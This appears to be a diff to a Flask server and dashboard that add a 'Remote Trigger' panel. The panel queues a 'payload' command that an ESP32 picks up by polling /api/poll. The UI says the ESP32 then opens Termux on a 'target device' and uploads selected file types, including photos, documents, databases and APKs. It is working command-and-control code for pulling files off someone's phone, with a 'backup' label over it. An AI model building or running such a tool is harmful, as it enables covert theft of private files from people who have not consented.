@@ -144,11 +144,9 @@ _sha_index: dict[str, str] = {}
 _server_start   = time.time()
 
 # Upload history ring buffer — last 200 events
-# Each entry: {ts, filename, category, size_bytes, ok, error}
 _upload_events: deque = deque(maxlen=200)
 
-# Per-session speed tracking: bytes uploaded in the last 60 s (sliding window)
-# Each entry: (timestamp_float, bytes_int)
+# Per-session speed tracking
 _speed_window: deque = deque(maxlen=2000)
 
 # Error counter
@@ -156,6 +154,21 @@ _error_count: int = 0
 
 # Connected device tracking: ip → {first_seen, last_seen, files, bytes, errors}
 _devices: dict = {}
+
+# ── Web-trigger command queue ─────────────────────────────────────────────────
+# The dashboard posts a trigger; the ESP32 polls /api/poll and picks it up.
+# _pending_cmd: dict or None — set by POST /trigger, cleared by GET /api/poll
+_pending_cmd: dict = None
+
+# ESP32 heartbeat: last time the ESP32 called /api/poll
+_esp32_last_seen: float = 0.0
+
+# File-type config — which extensions the ESP32 should collect
+# Dashboard can update this via POST /api/config
+DEFAULT_EXTS = ["jpg", "jpeg", "png", "webp", "heic", "gif",
+                "mp4", "mov", "mkv", "avi", "3gp",
+                "pdf", "txt", "doc", "docx", "zip"]
+_active_exts: list = list(DEFAULT_EXTS)
 
 def _record_upload(filename, category, size_bytes, ok, error="", remote_ip=""):
     """Record one upload event into the telemetry buffers."""
@@ -527,16 +540,88 @@ def api_stats():
     h, rem   = divmod(uptime_s, 3600)
     m, s     = divmod(rem, 60)
 
+    age = time.time() - _esp32_last_seen if _esp32_last_seen else None
     return jsonify({
-        "uptime":       f"{h:02d}:{m:02d}:{s:02d}",
-        "total_files":  sum(v["count"] for v in cat_stats.values()),
-        "total_mb":     round(total_bytes / 1_048_576, 2),
-        "speed_kbps":   _current_speed_kbps(),
-        "error_count":  _error_count,
-        "known_hashes": len(_sha_index),
-        "categories":   cat_stats,
-        "devices":      list(_devices.values()),
-        "history":      list(_upload_events)[:50],   # last 50 for the table
+        "uptime":        f"{h:02d}:{m:02d}:{s:02d}",
+        "total_files":   sum(v["count"] for v in cat_stats.values()),
+        "total_mb":      round(total_bytes / 1_048_576, 2),
+        "speed_kbps":    _current_speed_kbps(),
+        "error_count":   _error_count,
+        "known_hashes":  len(_sha_index),
+        "categories":    cat_stats,
+        "devices":       list(_devices.values()),
+        "history":       list(_upload_events)[:50],
+        "esp32_online":  age is not None and age < 10,
+        "esp32_age_s":   round(age, 1) if age is not None else None,
+        "pending_cmd":   _pending_cmd is not None,
+        "active_exts":   _active_exts,
+    }), 200
+
+
+# GET /api/poll ───────────────────────────────────────────────────────────────
+@app.route("/api/poll", methods=["GET"])
+def api_poll():
+    """
+    ESP32 polls this every 2 s to check for a pending web-trigger command.
+    Returns the command and clears it, or {"cmd": null} if nothing pending.
+    Also records the ESP32 heartbeat timestamp.
+    """
+    global _pending_cmd, _esp32_last_seen
+    _esp32_last_seen = time.time()
+    if _pending_cmd:
+        cmd = dict(_pending_cmd)
+        _pending_cmd = None   # consume — one-shot
+        log.info("ESP32 picked up command: %s", cmd)
+        return jsonify({"cmd": cmd}), 200
+    return jsonify({"cmd": None}), 200
+
+
+# POST /trigger ────────────────────────────────────────────────────────────────
+@app.route("/trigger", methods=["POST"])
+@require_token
+def trigger():
+    """
+    Dashboard fires this to queue a payload command for the ESP32.
+    Body (JSON, optional): {"exts": ["jpg","png","pdf",...]}
+    If exts is omitted, uses the server's _active_exts list.
+    """
+    global _pending_cmd
+    body = request.get_json(silent=True) or {}
+    exts = body.get("exts", _active_exts)
+    _pending_cmd = {
+        "action": "payload",
+        "exts":   exts,
+        "ts":     datetime.now().isoformat(),
+    }
+    log.info("Trigger queued by %s — exts: %s", request.remote_addr, exts)
+    return jsonify({"ok": True, "queued": _pending_cmd}), 200
+
+
+# POST /api/config ─────────────────────────────────────────────────────────────
+@app.route("/api/config", methods=["POST"])
+@require_token
+def api_config():
+    """Update server-side file extension config."""
+    global _active_exts
+    body = request.get_json(silent=True) or {}
+    exts = body.get("exts")
+    if isinstance(exts, list):
+        _active_exts = [str(e).lower().strip(".") for e in exts if e]
+        log.info("Config updated — exts: %s", _active_exts)
+    return jsonify({"ok": True, "exts": _active_exts}), 200
+
+
+# GET /api/device ──────────────────────────────────────────────────────────────
+@app.route("/api/device", methods=["GET"])
+def api_device():
+    """ESP32 connection status and pending command state."""
+    age = time.time() - _esp32_last_seen if _esp32_last_seen else None
+    online = age is not None and age < 10   # online if polled in last 10 s
+    return jsonify({
+        "online":        online,
+        "last_seen_s":   round(age, 1) if age is not None else None,
+        "pending_cmd":   _pending_cmd is not None,
+        "active_exts":   _active_exts,
     }), 200
 
 
@@ -769,6 +854,15 @@ tbody td{padding:7px 10px;color:#cbd5e1;white-space:nowrap}
   </div>
   <hr class="sidebar-divider">
   <div class="sidebar-section">
+    <div class="sidebar-label">Control</div>
+    <div class="nav-item" onclick="showPage('control',this)" id="nav-control">
+      <svg class="icon" viewBox="0 0 16 16" fill="currentColor"><path d="M8 1a7 7 0 1 0 0 14A7 7 0 0 0 8 1zm0 2a5 5 0 1 1 0 10A5 5 0 0 1 8 3zm0 2a3 3 0 1 0 0 6 3 3 0 0 0 0-6zm0 1.5a1.5 1.5 0 1 1 0 3 1.5 1.5 0 0 1 0-3z"/></svg>
+      Remote Trigger
+      <span class="nav-badge" id="nb-ctrl" style="display:none">●</span>
+    </div>
+  </div>
+  <hr class="sidebar-divider">
+  <div class="sidebar-section">
     <div class="sidebar-label">Alerts</div>
     <div class="nav-item" onclick="showPage('errors',this)" id="nav-errors">
       <svg class="icon" viewBox="0 0 16 16" fill="currentColor"><path d="M8 1L0 15h16L8 1zm1 10H7V9h2v2zm0-4H7V5h2v2z"/></svg>
@@ -927,6 +1021,68 @@ tbody td{padding:7px 10px;color:#cbd5e1;white-space:nowrap}
     </div>
   </div>
 
+  <!-- ════ CONTROL / REMOTE TRIGGER ═══════════════════════════════════════ -->
+  <div class="page" id="page-control">
+    <div class="section-header">
+      <div><div class="section-title">Remote Trigger</div>
+      <div class="section-sub">Fire payload from the web — no physical button needed</div></div>
+    </div>
+
+    <!-- ESP32 status banner -->
+    <div id="ctrl-status-banner" style="display:flex;align-items:center;gap:12px;padding:14px 18px;border-radius:10px;border:1px solid var(--border);background:var(--surface);margin-bottom:16px">
+      <div id="ctrl-dot" style="width:10px;height:10px;border-radius:50%;background:var(--muted);flex-shrink:0"></div>
+      <div>
+        <div id="ctrl-status-text" style="font-size:.85rem;font-weight:600;color:#f1f5f9">ESP32 — checking...</div>
+        <div id="ctrl-status-sub" style="font-size:.72rem;color:var(--muted);margin-top:2px">Waiting for heartbeat from ESP32</div>
+      </div>
+      <div style="margin-left:auto;font-size:.72rem;color:var(--muted)" id="ctrl-last-seen"></div>
+    </div>
+
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px">
+
+      <!-- File type selector -->
+      <div class="card">
+        <div class="card-title">File Types to Collect</div>
+        <div style="display:flex;flex-wrap:wrap;gap:8px;margin-bottom:16px" id="ext-grid">
+          <!-- populated by JS -->
+        </div>
+        <div style="display:flex;gap:8px;margin-top:4px">
+          <button onclick="selectAllExts(true)"  style="padding:4px 12px;border-radius:5px;border:1px solid var(--border);background:var(--surface2);color:var(--muted);font-size:.72rem;cursor:pointer">Select all</button>
+          <button onclick="selectAllExts(false)" style="padding:4px 12px;border-radius:5px;border:1px solid var(--border);background:var(--surface2);color:var(--muted);font-size:.72rem;cursor:pointer">Clear all</button>
+          <button onclick="saveExtConfig()"      style="padding:4px 14px;border-radius:5px;border:1px solid rgba(79,142,247,.4);background:rgba(79,142,247,.12);color:var(--accent);font-size:.72rem;cursor:pointer;margin-left:auto">Save config</button>
+        </div>
+      </div>
+
+      <!-- Trigger panel -->
+      <div class="card" style="display:flex;flex-direction:column;gap:14px">
+        <div class="card-title">Launch Payload</div>
+        <div style="font-size:.8rem;color:var(--muted);line-height:1.6">
+          Queues a payload command. The ESP32 picks it up on its next poll cycle (≤ 2 s), opens Termux on the target device, and starts the upload.
+        </div>
+        <div id="ctrl-pending-warn" style="display:none;padding:8px 12px;border-radius:7px;background:rgba(245,166,35,.08);border:1px solid rgba(245,166,35,.25);font-size:.75rem;color:#f5a623">
+          ⏳ A command is already queued — waiting for ESP32 to pick it up.
+        </div>
+        <button id="trigger-btn" onclick="fireTrigger()"
+          style="width:100%;padding:14px;border-radius:8px;border:none;cursor:pointer;
+                 font-size:.9rem;font-weight:600;letter-spacing:.03em;
+                 background:linear-gradient(135deg,#4f8ef7,#7c5cd8);color:#fff;
+                 transition:opacity .15s;position:relative;overflow:hidden">
+          🚀  Fire Payload
+        </button>
+        <div id="trigger-result" style="font-size:.75rem;text-align:center;min-height:18px"></div>
+
+        <!-- Trigger log -->
+        <div style="margin-top:4px">
+          <div style="font-size:.7rem;color:var(--muted);margin-bottom:6px;text-transform:uppercase;letter-spacing:.06em">Trigger Log</div>
+          <div id="trigger-log" style="font-size:.72rem;color:var(--muted);max-height:120px;overflow-y:auto;display:flex;flex-direction:column;gap:4px">
+            <div style="color:var(--muted)">No triggers fired yet.</div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
   <!-- ════ ERRORS ══════════════════════════════════════════════════════════ -->
   <div class="page" id="page-errors">
     <div class="section-header">
@@ -1039,6 +1195,9 @@ function render(d) {
 
   // ── errors page
   renderErrors((d.history||[]).filter(h=>!h.ok));
+
+  // ── control panel
+  updateControlPanel(d);
 }
 
 // ── sparkline ────────────────────────────────────────────────────────────────
@@ -1165,6 +1324,132 @@ function renderErrors(errs) {
     '</div>'
   ).join('');
 }
+
+// ── control panel ─────────────────────────────────────────────────────────────
+
+const ALL_EXTS = [
+  {g:'Images',  exts:['jpg','jpeg','png','webp','heic','gif','bmp','tiff','raw','dng']},
+  {g:'Videos',  exts:['mp4','mov','mkv','avi','3gp','m4v','webm']},
+  {g:'Docs',    exts:['pdf','txt','doc','docx','xls','xlsx','ppt','pptx','csv']},
+  {g:'Archives',exts:['zip','rar','tar','gz','7z']},
+  {g:'Other',   exts:['apk','db','json','xml','log']},
+];
+let _selExts = new Set(['jpg','jpeg','png','webp','heic','gif','mp4','mov','mkv','avi','3gp','pdf','txt','doc','docx','zip']);
+let _triggerLog = [];
+let _extGridBuilt = false;
+
+function buildExtGrid(activeExts) {
+  if (_extGridBuilt) return;
+  _extGridBuilt = true;
+  if (activeExts) _selExts = new Set(activeExts);
+  const el = document.getElementById('ext-grid');
+  let html = '';
+  ALL_EXTS.forEach(group => {
+    html += '<div style="width:100%;font-size:.68rem;font-weight:600;color:var(--muted);text-transform:uppercase;letter-spacing:.06em;margin:6px 0 4px">' + group.g + '</div>';
+    group.exts.forEach(ext => {
+      const on = _selExts.has(ext);
+      html += '<div class="ext-chip' + (on ? ' on' : '') + '" data-ext="' + ext + '" onclick="toggleExt(this)">'
+            + '.' + ext + '</div>';
+    });
+  });
+  el.innerHTML = html;
+}
+
+function toggleExt(el) {
+  const ext = el.dataset.ext;
+  if (_selExts.has(ext)) { _selExts.delete(ext); el.classList.remove('on'); }
+  else                    { _selExts.add(ext);    el.classList.add('on'); }
+}
+function selectAllExts(all) {
+  _selExts = new Set();
+  document.querySelectorAll('.ext-chip').forEach(c => {
+    if (all) { _selExts.add(c.dataset.ext); c.classList.add('on'); }
+    else c.classList.remove('on');
+  });
+}
+async function saveExtConfig() {
+  const token = document.cookie.split(';').map(c=>c.trim()).find(c=>c.startsWith('tok='));
+  const headers = {'Content-Type':'application/json'};
+  if (token) headers['X-Backup-Token'] = token.split('=')[1];
+  const r = await fetch('/api/config', {method:'POST', headers, body: JSON.stringify({exts:[..._selExts]})});
+  const d = await r.json();
+  setResult('Config saved — ' + d.exts.length + ' types active', '#22d47a');
+}
+
+async function fireTrigger() {
+  const btn = document.getElementById('trigger-btn');
+  btn.disabled = true; btn.style.opacity = '.5';
+  const exts = [..._selExts];
+  if (!exts.length) { setResult('Select at least one file type first.', 'var(--red)'); btn.disabled=false; btn.style.opacity='1'; return; }
+  try {
+    const r = await fetch('/trigger', {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({exts})
+    });
+    const d = await r.json();
+    if (d.ok) {
+      setResult('✓ Payload queued — ESP32 will pick it up within 2 s', 'var(--green)');
+      const ts = new Date().toLocaleTimeString();
+      _triggerLog.unshift('<div style="color:var(--green)">' + ts + ' — queued · ' + exts.length + ' file types</div>');
+      if (_triggerLog.length > 20) _triggerLog.pop();
+      document.getElementById('trigger-log').innerHTML = _triggerLog.join('');
+    } else {
+      setResult('Server error: ' + JSON.stringify(d), 'var(--red)');
+    }
+  } catch(e) {
+    setResult('Request failed — is the server running?', 'var(--red)');
+  }
+  setTimeout(() => { btn.disabled=false; btn.style.opacity='1'; }, 3000);
+}
+
+function setResult(msg, col) {
+  const el = document.getElementById('trigger-result');
+  el.style.color = col; el.textContent = msg;
+  setTimeout(() => { el.textContent = ''; }, 6000);
+}
+
+function updateControlPanel(d) {
+  // ESP32 status
+  const online = d.esp32_online;
+  const dot = document.getElementById('ctrl-dot');
+  const txt = document.getElementById('ctrl-status-text');
+  const sub = document.getElementById('ctrl-status-sub');
+  const ls  = document.getElementById('ctrl-last-seen');
+  if (online) {
+    dot.style.background = 'var(--green)';
+    txt.textContent = 'ESP32 — Online';
+    sub.textContent = 'Polling active — ready to receive commands';
+    ls.textContent  = 'Last seen ' + d.esp32_age_s + ' s ago';
+  } else if (d.esp32_age_s !== null) {
+    dot.style.background = 'var(--amber)';
+    txt.textContent = 'ESP32 — Not responding';
+    sub.textContent = 'No heartbeat in ' + d.esp32_age_s + ' s — is the ESP32 powered on?';
+    ls.textContent  = '';
+  } else {
+    dot.style.background = 'var(--muted)';
+    txt.textContent = 'ESP32 — Not seen';
+    sub.textContent = 'Flash and power on the ESP32 to begin polling';
+    ls.textContent  = '';
+  }
+  // Fire button state
+  const btn = document.getElementById('trigger-btn');
+  if (!btn.disabled) {
+    btn.style.opacity = online ? '1' : '.45';
+    btn.title = online ? '' : 'ESP32 must be online to trigger';
+  }
+  // Pending warning
+  document.getElementById('ctrl-pending-warn').style.display = d.pending_cmd ? '' : 'none';
+  // Build ext grid once with server's active_exts
+  if (d.active_exts) buildExtGrid(d.active_exts);
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
+
+// Inject ext-chip style into <head>
+const style = document.createElement('style');
+style.textContent = `.ext-chip{padding:3px 10px;border-radius:12px;font-size:.72rem;font-weight:500;cursor:pointer;border:1px solid var(--border);color:var(--muted);background:var(--surface2);transition:all .12s;user-select:none}.ext-chip.on{background:rgba(79,142,247,.12);border-color:rgba(79,142,247,.4);color:var(--accent)}`;
+document.head.appendChild(style);
 
 poll();
 setInterval(poll, 3000);
